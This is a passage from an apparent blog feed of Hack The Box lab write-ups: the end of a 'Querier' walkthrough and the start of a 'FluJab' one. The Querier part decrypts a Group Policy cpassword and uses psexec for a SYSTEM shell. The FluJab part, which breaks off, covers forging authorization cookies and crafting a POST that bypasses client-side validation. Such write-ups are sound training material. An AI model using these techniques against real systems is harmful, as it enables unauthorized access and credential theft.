&lt;span class=&quot;nt&quot;&gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2019-01-28 23:12:48&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userContext=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;removePolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;policyApplied=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Properties&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-still-need-to-decrypt-the-password-which-can-be-easily-done-using-gpp-decrypt-&quot;&gt;We still need to decrypt the password which can be easily done using &lt;code class=&quot;highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
MyUnclesAreMarioAndLuigi!!1!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;password-is-myunclesaremarioandluigi1-we-can-use-it-with-psexecpy-from-impacket-and-get-a-shell-as-system-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;. We can use it with &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and get a shell as system :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;second-write-up--hack-the-box---querier-commando&quot;&gt;Second write-up : &lt;a href=&quot;/hack-the-box/querier-2&quot;&gt;Hack The Box - Querier (Commando)&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post here. It’s a Windows box and its ip is 10.10.10.125, I added it to /etc/hosts as querier.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. Let’s check smb. Smb We need to list the shares first. I used smbclient : ``` smbclient –list //querier.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier/0.png" /></entry><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-&quot;&gt;Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability. &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel was installed on the box and I could get credentials for it by exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLi&lt;/code&gt;,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt; then I escaped &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; and exploited a vulnerable version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.124&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC flujab.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22-http-on-ports-80-and-8080-and-https-on-port-443-theres-also-some-sort-of-virtual-hosting-as-we-can-see-from-the-nmap-scan-and-there-are-a-lot-of-domains-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on ports 80 and 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443. There’s also some sort of virtual hosting as we can see from the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan and there are a lot of domains …&lt;/h4&gt;
&lt;h4 id=&quot;we-can-also-check-the-ssl-certificate-manually-&quot;&gt;We can also check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; certificate manually :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-added-all-of-them-to-etchosts-and-checked-them-however-i-will-skip-the-rabbit-holes-in-the-write-up-because-its-just-a-waste-of-time-if-we-take-a-look-at-what-we-have-&quot;&gt;I added all of them to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-machine-name-is-flujab-so-we-are-only-interested-in-&quot;&gt;The machine name is &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab&lt;/code&gt; so we are only interested in :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;console.flujab.htb
sys.flujab.htb
smtp.flujab.htb
freeflujab.htb
flujab.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-saw-that-error-about-direct-ip-access-when-we-visited-flujabhtb-lets-check-the-other-4&quot;&gt;We saw that error about direct ip access when we visited &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;, Let’s check the other 4.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;console.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;just-a-troll-&quot;&gt;Just a troll !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sys.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-same-error-on-flujabhtb&quot;&gt;The same error on &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-any-credentials-for-that&quot;&gt;We don’t have any credentials for that.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;freeflujab.htb&lt;/code&gt; : 
&lt;img src=&quot;/images/hackthebox/flujab/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/11.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/12.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/13.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-one-is-interesting-i-tried-to-run-gobuster-but-there-was-a-wildcard-response-when-i-checked-manually-i-found-that-instead-of-responding-with-404-it-responds-with-a-redirection-to-httpsclownwarehtbcwerror_pagesphp-which-has-a-gif-of-a-strange-creepy-clown-&quot;&gt;That one is interesting. I tried to run &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but there was a wildcard response. When I checked manually I found that instead of responding with &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; it responds with a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://clownware.htb/cwerror_pages.php&lt;/code&gt; which has a &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; of a strange creepy clown …&lt;/h4&gt;
&lt;h4 id=&quot;note--i-checked-them-all-on-port-8080-too-but-i-always-got-the-direct-ip-access-error&quot;&gt;Note : I checked them all on port 8080 too but I always got the direct ip access error.&lt;/h4&gt;
&lt;h4 id=&quot;i-started-burp-and-configured-the-scope-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and configured the scope :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-the-spider-&quot;&gt;Then I ran the spider :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;results-&quot;&gt;Results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-the-requests-and-the-responses-of-different-pages-and-actions-i-noticed-in-one-of-the-responses-a-set-cookie-header-that-sets-a-cookie-called-modus-and-sets-the-path-for-it-to-smtp_config&quot;&gt;I checked the requests and the responses of different pages and actions. I noticed in one of the responses a &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header that sets a cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and sets the path for it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-smtp_config-in-the-browser-and-looked-at-the-request-in-burp-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt; in the browser and looked at the request in &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-was-a-redirection-to-denied-we-are-sending-3-cookies-in-every-request--modus--patient-and-registered-modus-and-registered-are-base-64-encoded-strings-while-patient-is-an-md5-hash&quot;&gt;The response was a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?denied&lt;/code&gt;. We are sending 3 cookies in every request : &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; are &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; encoded strings while &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;modus--configurenull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;Configure=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered---f991b5fb6a2939471c7230b2db78225enull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;  = &lt;code class=&quot;highlighter-rouge&quot;&gt;f991b5fb6a2939471c7230b2db78225e=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered-is-using-the-same-hash-from-patient-after-some-guesses-i-found-that-this-hash-is-for-my-ip-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; is using the same hash from &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt;, After some guesses I found that this hash is for my ip :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anyway-we-can-try-to-change-these-values-from-null-to-true-and-see-what-happens-&quot;&gt;Anyway we can try to change these values from &lt;code class=&quot;highlighter-rouge&quot;&gt;Null&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; and see what happens :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 15 Jun 2019 10:34:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 3735
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-can-access-the-page-now&quot;&gt;Great, we can access the page now.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-doing-anything-i-noticed-this-message-about-the-whitelist&quot;&gt;Before doing anything I noticed this message about the whitelist:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-whitelist-and-looked-at-the-response-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; and looked at the response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/34.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;my-ip-wasnt-there-anyway-i-used-python-to-run-a-debugging-smtp-server-&quot;&gt;My ip wasn’t there. Anyway I used python to run a debugging &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-went-to-update-the-smtp-settings-and-add-mine-&quot;&gt;Then I went to update the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; settings and add mine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-got-this-message--a-valid-smtp-domain-address-is-required-so-i-checked-the-source-of-the-form-&quot;&gt;But I got this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;A Valid SMTP Domain Address Is Required&lt;/code&gt;. So I checked the source of the form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt;
	&amp;lt;div class=&quot;row aln-center&quot;&amp;gt;
		&amp;lt;div class=&quot;col-6 &quot;&amp;gt;
				&amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt;
				&amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt;
		&amp;lt;/div&amp;gt;
		&amp;lt;div class=&quot;col-12&quot;&amp;gt;
		&amp;lt;p&amp;gt;
			WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to 
			access this page! &amp;lt;br \&amp;gt; If you are not supposed to 
			change these settings then don't! whitelist will be 
			auto-updated.
		&amp;lt;/p&amp;gt;
			&amp;lt;ul class=&quot;actions&quot;&amp;gt;
				&amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt;
			&amp;lt;/ul&amp;gt;
		&amp;lt;/div&amp;gt;
	&amp;lt;/div&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;its-relying-on-client-side-validation-check-&quot;&gt;It’s relying on client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-means-that-we-can-bypass-it-easily-by-sending-the-data-directly-in-the-request-&quot;&gt;Which means that we can bypass it easily by sending the data directly in the request :&lt;/h4&gt;
&lt;h4 id=&quot;request--2&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

mailserver=10.10.xx.xx&amp;amp;port=25&amp;amp;save=Save+Mail+Server+Config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/41.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
